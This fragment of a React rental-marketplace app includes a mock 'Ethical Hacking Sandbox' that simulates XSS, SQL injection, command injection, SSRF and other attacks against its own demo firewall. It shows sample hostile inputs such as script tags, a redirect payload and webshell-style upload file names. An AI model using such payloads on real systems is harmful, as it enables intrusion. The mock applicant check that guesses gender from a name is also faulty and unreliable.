                        <div style={{ display: 'flex', flexDirection: 'column', gap: '0.8rem', maxHeight: '420px', overflowY: 'auto' }}>
                          {utilityTokens.filter(t => t.landlordId === currentUser.id).map(token => (
                            <div key={token.id} style={{ background: 'rgba(0,0,0,0.3)', border: '1px solid rgba(255,255,255,0.05)', padding: '0.8rem', borderRadius: '6px', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                              <div>
                                <div style={{ display: 'flex', gap: '0.8rem', alignItems: 'center', marginBottom: '0.2rem' }}>
                                  <strong style={{ color: '#fff', fontSize: '0.85rem' }}>Meter: {token.meterNumber}</strong>
                                  <span style={{ 
                                    fontSize: '0.6rem', 
                                    fontWeight: 'bold', 
                                    borderRadius: '4px', 
                                    padding: '0.1rem 0.3rem',
                                    background: token.status === 'available' ? 'rgba(34, 197, 94, 0.15)' : 'rgba(156, 163, 175, 0.15)',
                                    border: `1px solid ${token.status === 'available' ? '#22c55e' : '#9ca3af'}`,
                                    color: token.status === 'available' ? '#22c55e' : '#9ca3af'
                                  }}>
                                    {token.status.toUpperCase()}
                                  </span>
                                </div>
                                <span style={{ fontSize: '0.8rem', fontFamily: 'monospace', color: '#D4AF37' }}>{token.tokenCode}</span>
                                {token.status === 'sold' && (
                                  <p style={{ margin: '0.2rem 0 0 0', fontSize: '0.7rem', color: '#888' }}>
                                    Sold on {token.purchasedAt}
                                  </p>
                                )}
                              </div>
                              <div style={{ textAlign: 'right' }}>
                                <strong style={{ color: '#fff', fontSize: '0.9rem' }}>{token.price} ZAR</strong>
                              </div>
                            </div>
                          ))}
                        </div>
                      ) : (
                        <div style={emptyStateStyle}>No sub-meter vouchers created yet. Use the generator on the left.</div>
                      )}
                    </div>
                  </div>
                </div>
              )}

            </div>
          )}
        </div>

        {/* RIGHT COLUMN: Interactive Security sandbox panel */}
        <div style={sidebarColumnStyle}>
          
          {/* Tenant sent application status tracker */}
          {(currentUser.role === 'tenant' || currentUser.role === 'visitor') && (
            <div className="glass-panel" style={tenantRequestsPanelStyle}>
              <h3 style={panelTitleStyle}>My Active Room Applications</h3>
              {tenantRequests.length > 0 ? (
                <div style={tenantReqListStyle}>
                  {tenantRequests.map(req => (
                    <div key={req.id} style={tenantReqCardStyle}>
                      <p style={tenantReqTitleStyle}>{req.listingTitle}</p>
                      <p style={tenantReqDateStyle}>Sent: {req.timestamp}</p>
                      <div style={tenantReqFooterStyle}>
                        <span style={badgeStyleStyle(req.status)}>{req.status.toUpperCase()}</span>
                      </div>
                    </div>
                  ))}
                </div>
              ) : (
                <div style={emptyStateStyle}>You have not applied for any rooms yet.</div>
              )}
            </div>
          )}

          {/* Interactive Pentest Console */}
          <AnimatePresence>
            {showSecurityConsole && (
              <motion.div 
                initial={{ opacity: 0, y: 10 }}
                animate={{ opacity: 1, y: 0 }}
                exit={{ opacity: 0, y: 10 }}
                className="glass-panel" 
                style={consolePanelStyle}
              >
                <div style={consoleHeaderStyle}>
                  <div style={consoleTitleWrapperStyle}>
                    <Terminal size={14} color="#D4AF37" />
                    <span>Ethical Hacking Sandbox (Security Labs)</span>
                  </div>
                  <span style={consolePulseStyle} />
                </div>
                
                <p style={consoleDescStyle}>
                  Test common application vulnerabilities to see how our Next.js security configurations neutralize attacks in real-time.
                </p>                 {/* Hacking Simulator buttons */}
                <div style={hackButtonsRowStyle}>
                  <button 
                    onClick={() => runHackSimulation('xss')}
                    style={hackBtnStyle}
                    title="Simulate Cross-Site Scripting Injection"
                  >
                    1. XSS Injection (Input Script Attack)
                  </button>
                  <button 
                    onClick={() => runHackSimulation('idor')}
                    style={hackBtnStyle}
                    title="Simulate Insecure Direct Object Reference"
                  >
                    2. IDOR Privilege Bypass (Record Hijack)
                  </button>
                  <button 
                    onClick={() => runHackSimulation('flood')}
                    style={hackBtnStyle}
                    title="Simulate API brute-force DOS flood"
                  >
                    3. API Flood DDoS (Rate limit triggers)
                  </button>
                  <button 
                    onClick={() => runHackSimulation('sqli')}
                    style={hackBtnStyle}
                    title="Simulate SQL Injection query parameters block"
                  >
                    4. SQL Injection (UNION SELECT Query)
                  </button>
                  <button 
                    onClick={() => runHackSimulation('traversal')}
                    style={hackBtnStyle}
                    title="Simulate Directory/Path Traversal Attack"
                  >
                    5. Path Traversal (Access System Files)
                  </button>
                  <button 
                    onClick={() => runHackSimulation('cmdi')}
                    style={hackBtnStyle}
                    title="Simulate OS Command Injection Attack"
                  >
                    6. Command Injection (Shell Execution)
                  </button>
                  <button 
                    onClick={() => runHackSimulation('ssrf')}
                    style={hackBtnStyle}
                    title="Simulate Server-Side Request Forgery Attack"
                  >
                    7. SSRF Attack (Internal Network Scan)
                  </button>
                  <button 
                    onClick={() => runHackSimulation('nosqli')}
                    style={hackBtnStyle}
                    title="Simulate MongoDB/NoSQL Operator Injection"
                  >
                    8. NoSQL Injection (Operator Bypass)
                  </button>
                </div>

                {/* WAF Live Traffic Visualizer */}
                {(() => {
                  const latestLog = securityLogs[0]
                  const isLastSqli = latestLog?.type === 'sqli_blocked'
                  const isLastXss = latestLog?.type === 'xss_blocked'
                  const isLastIdor = latestLog?.type === 'idor_prevented'
                  const isLastRate = latestLog?.type === 'rate_limit_triggered'
                  const isLastMalware = latestLog?.type === 'upload_malware_blocked'

                  return (
                    <div style={wafContainerStyle}>
                      <p style={logTitleStyle}><Shield size={12} style={{ marginRight: 6 }} /> Visual WAF Filter Engine</p>
                      <div style={wafFlowContainerStyle}>
                        {/* Flowing animated packet simulation */}
                        <div style={wafVisualFlowStyle}>
                          <motion.div 
                            animate={{ 
                              x: [0, 80, 160, 240, 310], 
                              y: [0, 5, -5, 5, 0],
                              backgroundColor: latestLog && latestLog.type !== 'auth_success' ? ['#22c55e', '#ef4444', '#ef4444'] : ['#22c55e', '#22c55e', '#3b82f6']
                            }}
                            transition={{ repeat: Infinity, duration: 3, ease: 'linear' }}
                            style={wafPacketStyle}
                          />
                          <div style={wafLineStyle} />
                        </div>

                        <div style={wafStatusGridStyle}>
                          <div style={{ ...wafNodeStyle, borderColor: isLastRate ? '#ef4444' : 'rgba(255,255,255,0.08)' }}>
                            <span style={{ ...wafNodeIndicatorStyle, background: isLastRate ? '#ef4444' : '#22c55e' }} />
                            <span style={wafNodeLabelStyle}>Rate Limiter: {isLastRate ? 'LOCKOUT' : 'ACTIVE'}</span>
                          </div>
                          <div style={{ ...wafNodeStyle, borderColor: isLastSqli ? '#ef4444' : 'rgba(255,255,255,0.08)' }}>
                            <span style={{ ...wafNodeIndicatorStyle, background: isLastSqli ? '#ef4444' : '#22c55e' }} />
                            <span style={wafNodeLabelStyle}>SQLi Engine: {isLastSqli ? 'BLOCKED' : 'FILTERING'}</span>
                          </div>
                          <div style={{ ...wafNodeStyle, borderColor: isLastXss ? '#ef4444' : 'rgba(255,255,255,0.08)' }}>
                            <span style={{ ...wafNodeIndicatorStyle, background: isLastXss ? '#ef4444' : '#22c55e' }} />
                            <span style={wafNodeLabelStyle}>XSS Sandbox: {isLastXss ? 'STRIPPED' : 'SANITIZING'}</span>
                          </div>
                          <div style={{ ...wafNodeStyle, borderColor: isLastIdor ? '#ef4444' : 'rgba(255,255,255,0.08)' }}>
                            <span style={{ ...wafNodeIndicatorStyle, background: isLastIdor ? '#ef4444' : '#22c55e' }} />
                            <span style={wafNodeLabelStyle}>IDOR Guard: {isLastIdor ? 'DENIED' : 'SECURE'}</span>
                          </div>
                          <div style={{ ...wafNodeStyle, borderColor: isLastMalware ? '#ef4444' : 'rgba(255,255,255,0.08)' }}>
                            <span style={{ ...wafNodeIndicatorStyle, background: isLastMalware ? '#ef4444' : '#22c55e' }} />
                            <span style={wafNodeLabelStyle}>Malware: {isLastMalware ? 'BLOCKED' : 'SECURE'}</span>
                          </div>
                        </div>
                      </div>
                    </div>
                  )
                })()}

                {/* XSS Live Playground */}
                <div style={playgroundGroupStyle}>
                  <p style={logTitleStyle}><FileCode size={12} style={{ marginRight: 6 }} /> Real-time XSS Sanitizer Preview:</p>
                  <textarea 
                    rows={2}
                    placeholder="Type <script>alert('hack')</script> here to see real-time filter action..."
                    value={sanitizationInput}
                    onChange={(e) => handleSanitizationCheck(e.target.value)}
                    style={consoleTextareaStyle}
                  />
                  <div style={sanitizationOutputBoxStyle}>
                    <span style={sanLabelStyle}>Sanitized Value saved to DB:</span>
                    <code style={sanValueStyle}>{sanitizationOutput || '(clean input will render here)'}</code>
                  </div>
                </div>

                {/* File Upload vulnerability test */}
                <div style={{ ...playgroundGroupStyle, marginTop: '1rem' }}>
                  <p style={logTitleStyle}><Upload size={12} style={{ marginRight: 6 }} /> Simulated File upload pentesting:</p>
                  <div style={hackButtonsRowStyle}>
                    <button 
                      onClick={() => triggerMockUpload('exploit.php', 'document')}
                      style={hackBtnStyle}
                    >
                      Test upload execution file (.php)
                    </button>
                    <button 
                      onClick={() => triggerMockUpload('webshell.exe.jpg', 'listing')}
                      style={hackBtnStyle}
                    >
                      Test upload spoofed extension (.exe.jpg)
                    </button>
                  </div>
                </div>

                <div style={{ ...inputGroupStyle, marginTop: '1rem' }}>
                  <label style={labelStyleStyle}>Custom XSS URL query string simulation</label>
                  <input 
                    type="text" 
                    placeholder="?search=<script>window.location=...</script>" 
                    value={hackPayload}
                    onChange={(e) => setHackPayload(e.target.value)}
                    style={consoleInputStyle}
                  />
                </div>

                {hackFeedback && (
                  <div style={feedbackBoxStyleStyle(hackFeedbackType)}>
                    <Info size={14} style={{ marginRight: 6 }} />
                    <span>{hackFeedback}</span>
                  </div>
                )}

                {/* Security Live Logs */}
                <div style={logConsoleStyle}>
                  <p style={logTitleStyle}>Edge Protection Firewalls - Live logs:</p>
                  <div style={logScrollAreaStyle}>
                    {securityLogs.length > 0 ? (
                      securityLogs.map(log => (
                        <div key={log.id} style={logLineStyleStyle(log.type)}>
                          <span style={logTimeStyle}>[{log.timestamp.substr(11, 8)}]</span>
                          <span style={logTypeLabelStyle}>[{log.type.toUpperCase()}]</span>
                          <span>{log.action} - {log.details}</span>
                        </div>
                      ))
                    ) : (
                      <div style={logEmptyStyle}>Security middleware active. No incidents logged.</div>
                    )}
                  </div>
                </div>
              </motion.div>
            )}
          </AnimatePresence>

          {/* Quick Informative Info Box */}
          <div className="glass-panel" style={infoBoxStyle}>
            <h4 style={infoBoxTitleStyle}><Info size={14} style={{ marginRight: 6 }} /> Security Hardening Details</h4>
            <p style={infoBoxDescStyle}>
              Our application is hardened at the edge using Next.js route protections, strict Content-Security-Policies (CSP) to stop scripts, input level sanitisers, and Zod type validations. Live pentesting results are recorded in the labs console.
            </p>
          </div>

        </div>

      </div>

      {/* ================= MODAL: CREATE LISTING ================= */}
      {showCreateModal && (
        <div style={modalBackdropStyle}>
          <motion.div 
            initial={{ scale: 0.9, opacity: 0 }}
            animate={{ scale: 1, opacity: 1 }}
            className="glass-panel" 
            style={modalPanelStyle}
          >
            <div style={modalHeaderStyle}>
              <h3>List a New Rental Room</h3>
              <button onClick={() => setShowCreateModal(false)} style={closeBtnStyle}><X size={16} /></button>
            </div>

            <form onSubmit={handleCreateListing} style={formStyleStyle}>
              <div style={rowStyleStyle}>
                <div style={inputGroupStyle}>
                  <label style={labelStyleStyle}>Room Listing Title</label>
                  <input 
                    type="text" 
                    required 
                    placeholder="e.g. Spacious Secure Backroom Ivory Park" 
                    value={newTitle}
                    onChange={(e) => setNewTitle(e.target.value)}
                    style={modalInputStyle}
                  />
                </div>
                <div style={inputGroupStyle}>
                  <label style={labelStyleStyle}>Monthly Rent</label>
                  <input 
                    type="number" 
                    required 
                    value={newPrice}
                    onChange={(e) => setNewPrice(parseInt(e.target.value) || 0)}
                    style={modalInputStyle}
                  />
                </div>
              </div>

              <div style={rowStyleStyle}>
                <div style={inputGroupStyle}>
                  <label style={labelStyleStyle}>City / Country</label>
                  <input 
                    type="text" 
                    required 
                    value={newLocation}
                    onChange={(e) => setNewLocation(e.target.value)}
                    style={modalInputStyle}
                  />
                </div>
                <div style={inputGroupStyle}>
                  <label style={labelStyleStyle}>Suburb / Ext</label>
                  <input 
                    type="text" 
                    required 
                    value={newSuburb}
                    onChange={(e) => setNewSuburb(e.target.value)}
                    style={modalInputStyle}
                  />
                </div>
              </div>

              <div style={inputGroupStyle}>
                <label style={labelStyleStyle}>Room Description</label>
                <textarea 
                  rows={2} 
                  required 
                  placeholder="Describe key features, safety level, local travel convenience, etc."
                  value={newDesc}
                  onChange={(e) => setNewDesc(e.target.value)}
                  style={modalTextareaStyle}
                />
              </div>

              {/* Secure Image File Upload Mock */}
              <div style={inputGroupStyle}>
                <label style={labelStyleStyle}>Property Room Picture (Allowed: .jpg, .png)</label>
                <div style={uploadContainerStyleStyle}>
                  <input 
                    type="text"
                    placeholder="Enter file name to upload (e.g., room1.jpg, exploit.php...)"
                    onChange={(e) => {
                      if(e.target.value) {
                        triggerMockUpload(e.target.value, 'listing')
                      }
                    }}
                    style={modalInputStyle}
                  />
                  {uploadedImageName && (
                    <p style={uploadSuccessLabelStyle}><ShieldCheck size={12} style={{ marginRight: 4 }} /> Secure File Accepted: {uploadedImageName}</p>
                  )}
                  {uploadError && (
                    <p style={uploadErrorLabelStyle}><AlertTriangle size={12} style={{ marginRight: 4 }} /> {uploadError}</p>
                  )}
                </div>
              </div>

              {/* Toggles */}
              <div style={checkboxGridStyle}>
                <div style={checkboxWrapperStyle}>
                  <input 
                    type="checkbox" 
                    id="newLives" 
                    checked={newLivesHere} 
                    onChange={(e) => setNewLivesHere(e.target.checked)}
                    style={checkboxStyle}
                  />
                  <label htmlFor="newLives" style={checkboxLabelStyle}>Landlord lives on property</label>
                </div>
                <div style={checkboxWrapperStyle}>
                  <input 
                    type="checkbox" 
                    id="newWifi" 
                    checked={newWifi} 
                    onChange={(e) => setNewWifi(e.target.checked)}
                    style={checkboxStyle}
                  />
                  <label htmlFor="newWifi" style={checkboxLabelStyle}>WiFi Included</label>
                </div>
                <div style={checkboxWrapperStyle}>
                  <input 
                    type="checkbox" 
                    id="newParking" 
                    checked={newParking} 
                    onChange={(e) => setNewParking(e.target.checked)}
                    style={checkboxStyle}
                  />
                  <label htmlFor="newParking" style={checkboxLabelStyle}>Parking Available</label>
                </div>
              </div>

              <div style={rowStyleStyle}>
                <div style={inputGroupStyle}>
                  <label style={labelStyleStyle}>Bathroom Style</label>
                  <select 
                    value={newBathroom} 
                    onChange={(e) => setNewBathroom(e.target.value as 'shared' | 'private' | 'ensuite')}
                    style={modalSelectStyle}
                  >
                    <option value="shared">Shared Bathroom</option>
                    <option value="private">Private (Dedicated)</option>
                    <option value="ensuite">En-suite (Inside Room)</option>
                  </select>
                </div>

                <div style={inputGroupStyle}>
                  <label style={labelStyleStyle}>Gender Preference</label>
                  <select 
                    value={newGenderPref} 
                    onChange={(e) => setNewGenderPref(e.target.value as 'men' | 'women' | 'couple' | 'any')}
                    style={modalSelectStyle}
                  >
                    <option value="any">Any Welcomed</option>
                    <option value="men">Men Only</option>
                    <option value="women">Women Only</option>
                    <option value="couple">Couples Only</option>
                  </select>
                </div>
              </div>

              <div style={rowStyleStyle}>
                <div style={{ ...checkboxWrapperStyle, paddingTop: '2rem' }}>
                  <input 
                    type="checkbox" 
                    id="newChildrenAllowed" 
                    checked={newChildrenAllowed} 
                    onChange={(e) => setNewChildrenAllowed(e.target.checked)}
                    style={checkboxStyle}
                  />
                  <label htmlFor="newChildrenAllowed" style={checkboxLabelStyle}>Children Allowed</label>
                </div>

                {newChildrenAllowed && (
                  <div style={inputGroupStyle}>
                    <label style={labelStyleStyle}>Max Children Allowed</label>
                    <input 
                      type="number" 
                      min={0} 
                      max={10} 
                      value={newMaxChildren}
                      onChange={(e) => setNewMaxChildren(parseInt(e.target.value) || 0)}
                      style={modalInputStyle}
                    />
                  </div>
                )}
              </div>

              <button 
                type="submit" 
                className="btn-gold" 
                style={modalSubmitBtnStyle}
                disabled={!!uploadError}
              >
                Publish Room Listing
              </button>
            </form>
          </motion.div>
        </div>
      )}

      {/* ================= MODAL: TENANT APPLY FOR ROOM ================= */}
      {activeListing && (
        <div style={modalBackdropStyle}>
          <motion.div 
            initial={{ scale: 0.9, opacity: 0 }}
            animate={{ scale: 1, opacity: 1 }}
            className="glass-panel" 
            style={modalPanelStyle}
          >
            <div style={modalHeaderStyle}>
              <h3>Apply for: {activeListing.title}</h3>
              <button onClick={() => setActiveListing(null)} style={closeBtnStyle}><X size={16} /></button>
            </div>

            <div style={applySummaryBoxStyle}>
              <p style={applySummaryTitleStyle}>Your Profile requirements will be sent to the Landlord:</p>
              <div style={profileSummaryGridStyle}>
                <p>Gender: <span style={boldValueStyle}>{currentUser.profile?.gender.toUpperCase()}</span></p>
                <p>Children: <span style={boldValueStyle}>{currentUser.profile?.childrenCount}</span></p>
                <p>Employment: <span style={boldValueStyle}>{currentUser.profile?.employmentStatus}</span></p>
                <p>Pets: <span style={boldValueStyle}>{currentUser.profile?.hasPets ? 'Yes' : 'No'}</span></p>
              </div>
            </div>

            <form onSubmit={handleApply} style={formStyleStyle}>
              <div style={inputGroupStyle}>
                <label style={labelStyleStyle}>Message to Landlord</label>
                <textarea 
                  rows={3} 
                  required 
                  value={applyMessage}
                  onChange={(e) => setApplyMessage(e.target.value)}
                  style={modalTextareaStyle}
                />
              </div>

              {/* Secure tenant document upload */}
              <div style={inputGroupStyle}>
                <label style={labelStyleStyle}>Attach Verification Payslip / ID (Allowed: .pdf, .png)</label>
                <div style={uploadContainerStyleStyle}>
                  <input 
                    type="text" 
                    placeholder="Enter file name (e.g. payslip.pdf, exploit.php...)"
                    onChange={(e) => {
                      if(e.target.value) {
                        triggerMockUpload(e.target.value, 'document')
                      }
                    }}
                    style={modalInputStyle}
                  />
                  {applyFileUploaded && (
                    <p style={uploadSuccessLabelStyle}><ShieldCheck size={12} style={{ marginRight: 4 }} /> Secure File Attached: {applyFileUploaded}</p>
                  )}
                  {uploadError && (
                    <p style={uploadErrorLabelStyle}><AlertTriangle size={12} style={{ marginRight: 4 }} /> {uploadError}</p>
                  )}
                </div>
              </div>

              <button 
                type="submit" 
                className="btn-primary" 
                style={modalSubmitBtnStyle}
                disabled={!!uploadError}
              >
                Send Room Request <Send size={14} style={{ marginLeft: 8 }} />
              </button>
            </form>
          </motion.div>
        </div>
      )}

      {/* ================= MODAL: REGISTER BUSINESS / SKILLS CARD ================= */}
      {showBusinessRegModal && (
        <div style={modalBackdropStyle}>
          <motion.div 
            initial={{ scale: 0.9, opacity: 0 }}
            animate={{ scale: 1, opacity: 1 }}
            className="glass-panel" 
            style={modalPanelStyle}
          >
            <div style={modalHeaderStyle}>
              <h3>Register My Service / Business Card</h3>
              <button onClick={() => setShowBusinessRegModal(false)} style={closeBtnStyle}><X size={16} /></button>
            </div>

            <form onSubmit={handleCreateBusiness} style={formStyleStyle}>
              <div style={rowStyleStyle}>
                <div style={inputGroupStyle}>
                  <label style={labelStyleStyle}>Business / Skills Name</label>
                  <input 
                    type="text" 
                    required 
                    placeholder="e.g. Sipho Plumbers, Themba Moving Bakkie" 
                    value={bizName}
                    onChange={(e) => setBizName(e.target.value)}
                    style={modalInputStyle}
                  />
                </div>
                <div style={inputGroupStyle}>
                  <label style={labelStyleStyle}>Service Category</label>
                  <select 
                    value={bizCategory} 
                    onChange={(e) => setBizCategory(e.target.value as HandymanService['category'])}
                    style={modalSelectStyle}
                  >
                    <option value="Plumbing">Plumbing Services</option>
                    <option value="Electrical">Electrical Repairs</option>
                    <option value="Construction">Building & Construction</option>
                    <option value="Cleaning">Cleaning & Gardening</option>
                    <option value="Security">Security Installations</option>
                    <option value="Bakkie / Transport">Bakkie / Transport / Moving Logistics</option>
                    <option value="Moving Assistant">Moving Helper / Handyman Assistant</option>
                    <option value="Local Materials">Local Materials Retailer</option>
                    <option value="General Services">General Professional Services</option>
                  </select>
                </div>
              </div>

              <div style={rowStyleStyle}>
                <div style={inputGroupStyle}>
                  <label style={labelStyleStyle}>Contact Number</label>
                  <input 
                    type="text" 
                    required 
                    placeholder="e.g. +27 72 456 7890" 
                    value={bizPhone}
                    onChange={(e) => setBizPhone(e.target.value)}
                    style={modalInputStyle}
                  />
                </div>
                <div style={inputGroupStyle}>
                  <label style={labelStyleStyle}>Price Estimate / Base Rate</label>
                  <input 
                    type="text" 
                    required 
                    placeholder="e.g. From 250 ZAR / hour, 400 ZAR / trip" 
                    value={bizPrice}
                    onChange={(e) => setBizPrice(e.target.value)}
                    style={modalInputStyle}
                  />
                </div>
              </div>

              <div style={rowStyleStyle}>
                <div style={inputGroupStyle}>
                  <label style={labelStyleStyle}>Location City/Country</label>
                  <input 
                    type="text" 
                    required 
                    value={bizLocation}
                    onChange={(e) => setBizLocation(e.target.value)}
                    style={modalInputStyle}
                  />
                </div>
                <div style={inputGroupStyle}>
                  <label style={labelStyleStyle}>Suburb / Ext</label>
                  <input 
                    type="text" 
                    required 
                    value={bizSuburb}
                    onChange={(e) => setBizSuburb(e.target.value)}
                    style={modalInputStyle}
                  />
                </div>
              </div>

              <div style={inputGroupStyle}>
                <label style={labelStyleStyle}>Website / Social Link (Optional)</label>
                <input 
                  type="url" 
                  placeholder="e.g. https://mybusiness.com" 
                  value={bizWebsite}
                  onChange={(e) => setBizWebsite(e.target.value)}
                  style={modalInputStyle}
                />
              </div>

              <div style={inputGroupStyle}>
                <label style={labelStyleStyle}>Category Image (Mock Stock Photo URL)</label>
                <select 
                  value={bizImage}
                  onChange={(e) => setBizImage(e.target.value)}
                  style={modalSelectStyle}
                >
                  <option value="https://images.unsplash.com/photo-1504307651254-35680f356dfd?auto=format&fit=crop&w=600&q=80">Plumbing (Tools & Pipes)</option>
                  <option value="https://images.unsplash.com/photo-1581092921461-eab62e97a780?auto=format&fit=crop&w=600&q=80">Electrical (Cables & Multimeter)</option>
                  <option value="https://images.unsplash.com/photo-1586528116311-ad8dd3c8310d?auto=format&fit=crop&w=600&q=80">Bakkie / Moving Van (Truck)</option>
                  <option value="https://images.unsplash.com/photo-1595246140625-573b715d11dc?auto=format&fit=crop&w=600&q=80">Moving Pack & Help (Boxes)</option>
                  <option value="https://images.unsplash.com/photo-1621905251189-08b45d6a269e?auto=format&fit=crop&w=600&q=80">Handyman / General Maintenance</option>
                  <option value="https://images.unsplash.com/photo-1522771739844-6a9f6d5f14af?auto=format&fit=crop&w=600&q=80">Building Hardware Materials</option>
                </select>
              </div>

              <div style={inputGroupStyle}>
                <label style={labelStyleStyle}>Service Description</label>
                <textarea 
                  rows={2} 
                  required 
                  placeholder="Describe your tools, experience, scope of work, availability, etc."
                  value={bizDesc}
                  onChange={(e) => setBizDesc(e.target.value)}
                  style={modalTextareaStyle}
                />
              </div>

              <button 
                type="submit" 
                className="btn-gold" 
                style={modalSubmitBtnStyle}
              >
                Publish Business Card
              </button>
            </form>
          </motion.div>
        </div>
      )}

      {/* ================= MODAL: HIRE CONTRACT DISPATCHER ================= */}
      {showHireModal && selectedBiz && (
        <div style={modalBackdropStyle}>
          <motion.div 
            initial={{ scale: 0.9, opacity: 0 }}
            animate={{ scale: 1, opacity: 1 }}
            className="glass-panel" 
            style={modalPanelStyle}
          >
            <div style={modalHeaderStyle}>
              <h3>Hire: {selectedBiz.businessName}</h3>
              <button onClick={() => { setShowHireModal(false); setSelectedBiz(null); }} style={closeBtnStyle}><X size={16} /></button>
            </div>

            <div style={applySummaryBoxStyle}>
              <p style={applySummaryTitleStyle}>You are hiring this service provider under a local contract:</p>
              <div style={profileSummaryGridStyle}>
                <p>Category: <span style={boldValueStyle}>{selectedBiz.category}</span></p>
                <p>Rates: <span style={boldValueStyle}>{selectedBiz.priceEstimate}</span></p>
                <p>Location: <span style={boldValueStyle}>{selectedBiz.suburb}, {selectedBiz.location}</span></p>
                <p>Phone: <span style={boldValueStyle}>{selectedBiz.contactNumber}</span></p>
              </div>
            </div>

            <form onSubmit={handleDispatchContract} style={formStyleStyle}>
              <div style={inputGroupStyle}>
                <label style={labelStyleStyle}>Scope of Work / Message Details</label>
                <textarea 
                  rows={3} 
                  required 
                  placeholder="Explain what help you need, date of service, travel distance, and any price negotiations..."
                  value={hireMessage}
                  onChange={(e) => setHireMessage(e.target.value)}
                  style={modalTextareaStyle}
                />
              </div>

              <button 
                type="submit" 
                className="btn-primary" 
                style={modalSubmitBtnStyle}
              >
                Dispatch Contract Offer <Send size={14} style={{ marginLeft: 8 }} />
              </button>
            </form>
          </motion.div>
        </div>
      )}

      {/* ================= MODAL: LANDLORD REQUIREMENT VERIFICATION ================= */}
      {activeRequest && (
        <div style={modalBackdropStyle}>
          <motion.div 
            initial={{ scale: 0.9, opacity: 0 }}
            animate={{ scale: 1, opacity: 1 }}
            className="glass-panel" 
            style={verifyModalPanelStyle}
          >
            <div style={modalHeaderStyle}>
              <h3>Verify Applicant Requirements</h3>
              <button onClick={() => setActiveRequest(null)} style={closeBtnStyle}><X size={16} /></button>
            </div>

            {(() => {
              const matchingListing = listings.find(l => l.id === activeRequest.listingId)
              
              // We'll mock the applicant's profile based on their registration
              const mockApplicantProfile = {
                gender: activeRequest.tenantName.toLowerCase().includes('Sarah') ? 'women' : 'men',
                childrenCount: activeRequest.tenantName.toLowerCase().includes('Sarah') ? 1 : 0,
                employmentStatus: 'Employed',
                hasPets: false,
                bio: 'Looking for room closer to work hubs.'
              }

              if (!matchingListing) return <p>Listing not found.</p>

              // Match checks
              const isGenderMatch = matchingListing.requirements.genderPreference === 'any' || 
                                    matchingListing.requirements.genderPreference === mockApplicantProfile.gender
              const isChildrenMatch = !mockApplicantProfile.childrenCount || 
                                      (matchingListing.requirements.childrenAllowed && 
                                       mockApplicantProfile.childrenCount <= matchingListing.requirements.maxChildren)
              const isPetMatch = matchingListing.requirements.petsAllowed || !mockApplicantProfile.hasPets

              return (
                <div style={verifyContentStyle}>
                  
                  <div style={verifyCardStyle}>
                    <h4 style={verifyTitleStyle}><UserIcon size={16} style={{ marginRight: 6 }} /> Tenant Profile</h4>
                    <p style={verifyBioStyle}>"{mockApplicantProfile.bio}"</p>
                    
                    <div style={verifyGridStyle}>
                      <div style={verifyDetailStyle}>
                        <span>Employment</span>
                        <strong>{mockApplicantProfile.employmentStatus}</strong>
                      </div>
                      <div style={verifyDetailStyle}>
                        <span>Gender</span>
                        <strong>{mockApplicantProfile.gender.toUpperCase()}</strong>
                      </div>
                      <div style={verifyDetailStyle}>
                        <span>Children</span>
                        <strong>{mockApplicantProfile.childrenCount}</strong>
                      </div>
                      <div style={verifyDetailStyle}>
                        <span>Pets</span>
                        <strong>{mockApplicantProfile.hasPets ? 'Yes' : 'No'}</strong>
                      </div>
                    </div>
                  </div>

                  <div style={verifyChecklistStyle}>
                    <h4 style={verifyTitleStyle}><Shield size={16} style={{ marginRight: 6 }} /> Requirement Matching Audit</h4>
                    
                    <div style={checkRowStyle}>
                      {isGenderMatch ? <CheckCircle2 color="#22c55e" size={18} /> : <AlertTriangle color="#ef4444" size={18} />}
                      <span style={checkTextStyle}>
                        Gender Preference Check: Listing prefers <span style={boldValueStyle}>{matchingListing.requirements.genderPreference.toUpperCase()}</span>. Applicant is <span style={boldValueStyle}>{mockApplicantProfile.gender.toUpperCase()}</span>.
                      </span>
                    </div>

                    <div style={checkRowStyle}>
                      {isChildrenMatch ? <CheckCircle2 color="#22c55e" size={18} /> : <AlertTriangle color="#ef4444" size={18} />}
                      <span style={checkTextStyle}>
                        Children Policy Audit: Listing allows <span style={boldValueStyle}>{matchingListing.requirements.childrenAllowed ? `Max ${matchingListing.requirements.maxChildren}` : 'No children'}</span>. Applicant has <span style={boldValueStyle}>{mockApplicantProfile.childrenCount}</span>.
                      </span>
                    </div>

                    <div style={checkRowStyle}>
                      {isPetMatch ? <CheckCircle2 color="#22c55e" size={18} /> : <AlertTriangle color="#ef4444" size={18} />}
                      <span style={checkTextStyle}>
                        Pet Policy Audit: Listing allows pets: <span style={boldValueStyle}>{matchingListing.requirements.petsAllowed ? 'Yes' : 'No'}</span>. Applicant has pets: <span style={boldValueStyle}>{mockApplicantProfile.hasPets ? 'Yes' : 'No'}</span>.
                      </span>
                    </div>
                  </div>

                  <div style={applyMsgBoxStyle}>
                    <p style={applyMsgHeaderStyle}>Applicant Cover Message:</p>
                    <p style={applyMsgTextStyle}>"{activeRequest.message}"</p>
                  </div>

                  <div style={verifyActionsRowStyle}>
                    <button 
                      onClick={() => handleStatusChange(activeRequest.id, 'approved')}
                      style={approveBtnStyle}
                    >
                      <Check size={16} style={{ marginRight: 8 }} /> Approve Request
                    </button>
                    <button 
                      onClick={() => handleStatusChange(activeRequest.id, 'rejected')}
                      style={rejectBtnStyle}
                    >
                      <X size={16} style={{ marginRight: 8 }} /> Reject Request
                    </button>
                  </div>

                </div>
              )
            })()}
          </motion.div>
        </div>
      )}

      {/* ================= MODAL: B2B PROOF OF WORK UPLOAD ================= */}
      {showProofModal && selectedDispatchForProof && (
        <div style={modalBackdropStyle}>
          <motion.div 
            initial={{ scale: 0.9, opacity: 0 }}
            animate={{ scale: 1, opacity: 1 }}
            className="glass-panel" 
            style={modalPanelStyle}
          >
            <div style={modalHeaderStyle}>
              <h3>Submit Proof of Work & Complete</h3>
              <button 
                onClick={() => { 
                  setShowProofModal(false)
                  setSelectedDispatchForProof(null)
                  setProofFileName('')
                  setProofFileError(null)
                }} 
                style={closeBtnStyle}
              >
                <X size={16} />
              </button>
            </div>

            <div style={applySummaryBoxStyle}>
              <p style={applySummaryTitleStyle}>Submit completion verification document for: {selectedDispatchForProof.serviceName}</p>
              <div style={profileSummaryGridStyle}>
                <p>Client: <span style={boldValueStyle}>{selectedDispatchForProof.senderName}</span></p>
                <p>Request: <span style={boldValueStyle}>"{selectedDispatchForProof.message}"</span></p>
              </div>
            </div>

            <form onSubmit={handleSubmitProofOfWork} style={formStyleStyle}>
